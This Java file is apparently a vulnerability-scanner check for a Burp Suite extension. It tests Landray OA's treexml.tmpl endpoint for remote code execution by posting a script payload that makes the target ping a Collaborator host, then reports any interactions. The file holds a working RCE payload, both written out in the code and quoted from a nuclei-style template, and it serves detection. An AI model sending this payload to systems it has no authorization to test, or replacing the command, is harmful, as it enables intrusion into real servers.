package com.alumm0x.scan.http.task.vuls;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.concurrent.TimeUnit;

import org.jetbrains.annotations.NotNull;

import com.alumm0x.scan.LogEntry;
import com.alumm0x.scan.http.task.impl.VulTaskImpl;
import com.alumm0x.tree.UselessTreeNodeEntity;
import com.alumm0x.util.BurpReqRespTools;
import com.alumm0x.util.CommonStore;

import burp.IBurpCollaboratorClientContext;
import burp.IBurpCollaboratorInteraction;
import burp.IHttpRequestResponse;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

public class LandrayOaTreexmlRce extends VulTaskImpl {
   /**
     * 蓝凌oa treecxml.templ命令执行
     *
     * yaml（https://github.com/tangxiaofeng7/Landray-OA-Treexml-Rce/blob/main/landray-oa-treexml-rce.yaml）
     * id: landray-oa-treexml-rce
     *
     * info:
     *   name: Landray OA treexml.tmpl Script RCE
     *   severity: high
     *   reference:
     *     - https://github.com/tangxiaofeng7
     *   tags: landray,oa,rce
     *
     * requests:
     *   - method: POST
     *     path:
     *       - '{{BaseURL}}/data/sys-common/treexml.tmpl'
     *
     *     body: |
     *         s_bean=ruleFormulaValidate&script=try {String cmd = "ping {{interactsh-url}}";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}
     *     headers:
     *       Pragma: no-cache
     *       Content-Type: application/x-www-form-urlencoded
     *
     *     matchers:
     *       - type: word
     *         part: interactsh_protocol
     *         name: http
     *         words:
     *           - "dns"
     *           - "http"
     */

    public static String name = "蓝凌OA treecxml.templ命令执行";
    public static String comments = "/data/sys-common/treexml.tmpl该接口存在命令执行";
    public static String fix = "升级版本,或是禁止该接口的公开访问。（https://www.cnvd.org.cn/flaw/show/CNVD-2021-28277）";

    public IBurpCollaboratorClientContext collaboratorClientContext;

    public UselessTreeNodeEntity entity;

    public LandrayOaTreexmlRce(UselessTreeNodeEntity entity) {
        this.entity = entity;
    }

    @Override
    public void run() {
        collaboratorClientContext = CommonStore.callbacks.createBurpCollaboratorClientContext();
        String payload = collaboratorClientContext.generatePayload(true);
        //新的请求包
        String poc_body = "s_bean=ruleFormulaValidate&script=try {String cmd = \"ping {{interactsh-url}}\";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}".replace("{{interactsh-url}}", payload);
   
        String url = BurpReqRespTools.getRootUrl(entity.getRequestResponse()) + "/data/sys-common/treexml.tmpl";
        CommonStore.okHttpRequester.send(url,
                "POST",
                BurpReqRespTools.getReqHeaders(entity.getRequestResponse()),
                BurpReqRespTools.getQuery(entity.getRequestResponse()),
                poc_body.getBytes(StandardCharsets.UTF_8),
                BurpReqRespTools.getContentType(entity.getRequestResponse()),
                new LandrayOaTreexmlRceCallback(this));
    }
}

class LandrayOaTreexmlRceCallback implements Callback {

    VulTaskImpl vulTask;
    UselessTreeNodeEntity entity;
    LogEntry logEntry;

    public LandrayOaTreexmlRceCallback(VulTaskImpl vulTask){
        this.vulTask = vulTask;
        this.entity = ((LandrayOaTreexmlRce)vulTask).entity;
        this.logEntry = vulTask.logAddToScanLogger(entity.getCurrent(), LandrayOaTreexmlRce.class.getSimpleName());
    }
    @Override
    public void onFailure(@NotNull Call call, @NotNull IOException e) {
        logEntry.onFailure();
        CommonStore.logModel.update();
        CommonStore.callbacks.printError("[LandrayOaTreexmlRceCallback]" + e.getMessage());
        logEntry.Comments = e.getMessage();
    }

    @Override
    public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
        IHttpRequestResponse requestResponse = BurpReqRespTools.makeBurpReqRespFormOkhttp(call,response, BurpReqRespTools.getHttpService(entity.getRequestResponse()));
        logEntry.requestResponse = CommonStore.callbacks.saveBuffersToTempFiles(requestResponse);
        logEntry.Status = (short) response.code();
        //如果状态码200
        if (response.isSuccessful()) {
            try {
                TimeUnit.SECONDS.sleep(10);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            List<IBurpCollaboratorInteraction> ret = ((LandrayOaTreexmlRce) vulTask).collaboratorClientContext.fetchAllCollaboratorInteractions();
            if (ret.size() > 0){
                logEntry.hasVuln();
                for (IBurpCollaboratorInteraction i :
                        ret) {
                    logEntry.Comments += i;
                }
            } else {
                logEntry.onResponse();
            }
        } else {
            logEntry.onResponse();
        }
    }
}
